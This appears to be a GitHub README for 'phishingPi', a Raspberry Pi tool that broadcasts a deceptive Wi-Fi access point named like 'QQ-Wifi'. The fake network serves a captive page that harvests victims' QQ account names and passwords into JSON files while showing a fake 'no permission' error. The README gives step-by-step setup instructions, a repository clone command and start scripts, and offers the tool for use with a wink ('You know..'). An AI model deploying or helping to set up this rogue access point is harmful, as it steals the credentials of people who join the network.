# phishingPi
This tool will set a soft-ap named QQ-Wifi(or other confusing name you like). As someone connect this AP, his browser will pop a page and request user's QQ account and password to login. After he logins, the page will return no permission and save all infomation in json files. You know..

### How to use it
1. Have a `raspberryPi`
2. Have a `wireless card` which supports raspberryPi
3. Connect your wireless card to raspberryPi and install the driver
4. Switch your wireless card to `AP mode`
5. Install `dhcpd` and change the address pool to `10.0.0.0/24`
6. Clone this repo `git clone https://github.com/tcz717/phishingPi.git`
7. Run `./setup.sh`
9. Run `./start.sh`
